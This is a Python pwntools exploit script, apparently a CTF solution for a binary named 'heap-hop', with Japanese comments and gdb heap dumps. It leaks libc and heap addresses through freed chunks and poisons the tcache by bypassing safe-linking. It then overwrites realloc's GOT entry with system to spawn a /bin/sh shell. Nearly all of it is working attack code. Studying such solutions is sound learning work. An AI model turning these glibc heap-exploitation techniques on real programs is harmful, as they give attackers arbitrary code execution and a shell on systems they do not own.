#!/usr/bin/env python3
from pwn import *
import warnings
warnings.simplefilter("ignore")

target = process("./heap-hop")
#gdb.attach(target, gdbscript="b handle_read")
elf = ELF("heap-hop")
glibc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def create(id, name, length, content):
    target.recvuntil("> ")
    target.sendline(b"1")
    target.recvuntil("> ")
    target.sendline(str(id))
    target.recvuntil("> ")
    target.sendline(name)
    target.recvuntil("> ")
    target.sendline(str(length))
    target.recvuntil("> ")
    target.sendline(content)

def edit(id, length, content):
    target.recvuntil("> ")
    target.sendline("3")
    target.recvuntil("> ")
    target.sendline(str(id))
    target.recvuntil("> ")
    target.sendline(str(length))
    target.recvuntil("> ")
    target.sendline(content)

def leak_read(id):
    target.recvuntil("> ")
    target.sendline("2")
    target.recvuntil("> ")
    target.sendline(str(id))
    target.recvline()
    target.recv(0x70)
    string = target.recv(6) + b"\x00" * 2
    string = u64(string)
    return string

def leak_heap():
    target.recvuntil("> ")
    target.sendline("2")
    target.recvuntil("> ")
    target.sendline("11")
    target.recvline()
    target.recv(0x80)
    string = u64(target.recv(8))
    return string

def shell():
    target.recvuntil("> ")
    target.sendline("3")
    target.recvuntil("> ")
    target.sendline("12")
    target.sendline("10")

create(0, b"", 5,  b"0")

for i in range(7):
    create(1 + i, "hello", 0x400, "world")

create(9, "", 0x20, "-")
create(10, "", 0x400, "-")

create(11, "", 0x200, "first")
create(12, "", 0x20, "second")

for i in range(7):
    edit(1 + i, 0, "")

edit(9, 0x0, "")
edit(11, 0x0, "")

#edit(9)で解放したチャンクに割り当て
edit(11, 0x20, b"target") 

#10はサイズ0x400, tcacheはすでに7あるのでunsortedへ
edit(10, 0x0, "")

leak = leak_read(11)
"""
0x9f8160:       0x00000000      0x00000000      0x00000031      0x00000000
0x9f8170:       0x67726174      0x000a7465      0x00000000      0x00000000
0x9f8180:       0x00000000      0x00000000      0x00000000      0x00000000
0x9f8190:       0x00000000      0x00000000      0x00000041      0x00000000
0x9f81a0:       0x0000000a      0x00000000      0x00000000      0x00000000
0x9f81b0:       0x00000000      0x00000000      0x00000000      0x00000000
0x9f81c0:       0x00000400      0x00000000      0x00000000      0x00000000
0x9f81d0:       0x00000000      0x00000000      0x00000411      0x00000000
0x9f81e0:       0xc89edce0      0x00007f6c      0xc89edce0      0x00007f6c
ちょうど上の位置がtargetの箇所
11のサイズは最初に確保した0x200のままなので表示される
"""
libc = leak - 0x219ce0
print("[*]libc is ",hex(libc))

#edit(10)で解放したunsortedのチャンクが割り当てられる
#これはさっきread(11)でみたtargetのチャンク
edit(1, 0x10, b"split")
edit(1, 0x0, "")
"""
0x1258160:      0x00000000      0x00000000      0x00000031      0x00000000
0x1258170:      0x67726174      0x000a7465      0x00000000      0x00000000
0x1258180:      0x00000000      0x00000000      0x00000000      0x00000000
0x1258190:      0x00000000      0x00000000      0x00000041      0x00000000
0x12581a0:      0x0000000a      0x00000000      0x00000000      0x00000000
0x12581b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x12581c0:      0x00000400      0x00000000      0x00000000      0x00000000
0x12581d0:      0x00000000      0x00000000      0x00000021      0x00000000
0x12581e0:      0x00001258      0x00000000      0x48494dc7      0xa7375769
0x12581f0:      0x012581d0      0x00000000      0x000003f1      0x00000000
0x1258200:      0x17afece0      0x00007f29      0x17afece0      0x00007f29
多分tcacheのfdあたりじゃないかな…？
"""
heap = leak_heap()
head_heap = heap - 0x21d0
print("[*]head_heap is ",hex(head_heap))

#10は最初に0x400で確保したやつ 予想通りunsortから割り当て
edit(10, 10, b"4649")

edit(0, 0, "")  # 一番初めに確保したチャンク tcache2番目
edit(10, 0, "") # unsortのやつから割り当て  tcache1番目

#targetを書き込んだチャンクのfdを書き換える
#これどうも0x2000の範囲ならokらしい >>12した値は0x2000~0x2fffの範囲までなら変わらないからだと思われる
#下位1.5バイトはあまり意味がない
edit(11, 0x20, b"Y" * 0x60 + p64(0) + p64(0x21) + p64( ((head_heap + 0x21f0) >> 12)  ^ (elf.got["realloc"] - 8)) )

#書き換えたtcache1番目のチャンクが割り当てられる 
#次に割り当てられるチャンクはreallocの位置
edit(3, 10, b"hello")
#これは最後にシェル呼び出す用
edit(12, 10, b"/bin/sh\x00")

#createだとmalloc(0x30)があるので無理
malloc = libc + glibc.symbols["malloc"]
system = libc + glibc.symbols["system"]
scanf  = libc + glibc.symbols["scanf"]
payload = p64(malloc) + p64(system) + p64(scanf)
edit(4, 10, payload)

shell()

target.interactive()